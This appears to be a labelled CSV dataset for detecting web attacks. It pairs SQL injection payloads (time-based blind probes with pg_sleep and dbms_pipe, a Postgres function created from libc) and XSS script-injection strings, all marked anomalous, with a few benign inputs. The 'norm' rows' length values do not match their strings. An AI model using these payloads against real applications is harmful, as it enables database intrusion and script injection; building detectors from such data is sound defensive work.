payload,length,attack_type,label
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",116,sqli,anom
"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",66,sqli,anom
1')));select pg_sleep(5)--,26,sqli,anom
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",82,sqli,anom
"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",60,sqli,anom
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",144,sqli,anom
"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",80,xss,anom
"</textarea>'""><script>alert(xss)</script>",41,xss,anom
"'""""><script language=""javascript""> alert('x s s');</script>",59,xss,anom
</script></script><<<<script><>>>><<<script>alert(xss)</script>,63,xss,anom
<html><noalert><noscript>(xss)</noscript><script>(xss)</script>,63,xss,anom
'></select><script>alert(xss)</script>,38,xss,anom
nasir,34,norm,norm
234,34,norm,norm
rasel,34,norm,norm
900,34,norm,norm
killer,34,norm,norm
